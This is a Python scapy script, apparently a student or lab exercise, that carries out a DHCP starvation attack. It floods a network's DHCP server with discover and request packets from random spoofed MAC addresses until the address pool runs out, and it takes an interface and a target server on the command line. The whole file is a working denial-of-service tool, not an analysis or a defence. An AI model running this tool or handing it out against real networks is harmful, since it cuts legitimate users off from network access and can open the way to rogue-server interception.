__author__ = 'Avital Haziza and Polina Frolov'


from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import sys


def main():
    len_arg = len(sys.argv)
    i = 0
    help=True
    while i != len_arg:
        if sys.argv[i] == '-h':
            help_function()
            help=False
            break
        i += 1

    i = 0
    interface = ''
    target = ''
    while i != len_arg:
        if sys.argv[i] == '-i':
            interface = sys.argv[i + 1]
            break
        i += 1

    i = 0
    while i != len_arg:
        if sys.argv[i] == '-t':
            target = sys.argv[i + 1]
        i += 1
    if help:
        discovery_spoofing(interface, target)


def discovery_spoofing(interface, target):
    inface = ''
    targ = ''
    if len(interface) == 0:
        inface = conf.iface
    else:
        inface = interface
    if len(target) == 0:
        targ = '255.255.255.255'
    else:
        targ = target

    real_mac = get_if_hwaddr(conf.iface)
    src_client_ip = '0.0.0.0'
    port_client = 68
    port_dhcp = 67
    yiaddr_client = "0.0.0.0"
    broadcast_mac = "ff:ff:ff:ff:ff:ff"

    while True:
        client_mac = RandMAC()
        transaction_ID = random.randint(0, (2 ** 16) - 1)
        # send discovery
        discovery = Ether(src=real_mac, dst=broadcast_mac) \
                    / IP(src=src_client_ip, dst=targ) \
                    / UDP(sport=port_client, dport=port_dhcp) \
                    / BOOTP(chaddr=[mac2str(client_mac)], xid=transaction_ID, flags=0xFFFFFF) \
                    / DHCP(
            options=[("message-type", "discover"), ('max_dhcp_size', 1500), ("client_id,", mac2str(client_mac)),
                     ('requested_addr', yiaddr_client), ('lease_time', 10000), ('end', 0)])
        sendp(discovery, iface=inface)

        # send request

        offer = '192.168.56.'
        offer = offer + str(random.randint(100, 150))
        request = Ether(src=real_mac, dst=broadcast_mac) \
                  / IP(src=src_client_ip, dst=targ) \
                  / UDP(sport=port_client, dport=port_dhcp) \
                  / BOOTP(chaddr=[mac2str(client_mac)], xid=transaction_ID, flags=0xFFFFFF) \
                  / DHCP(
            options=[("message-type", "request"), ('max_dhcp_size', 1500), ("client_id,", mac2str(client_mac)),
                     ('requested_addr', offer), ('lease_time', 10000), ('end', 0), ])
        sendp(request, iface=inface)


def help_function():
    print('usage: DHCPStarvationNEW.py [-h] [-i IFACE] [-t TARGET]')
    print('DHCP Starvation')
    print('optional arguments:')
    print('-h, --help show this help message and exit')
    print('-i IFACE, --iface IFACE')
    print('Interface you wish to use')
    print('-t TARGET, --target TARGET')
    print('IP of target server')


if __name__ == '__main__':
    main()
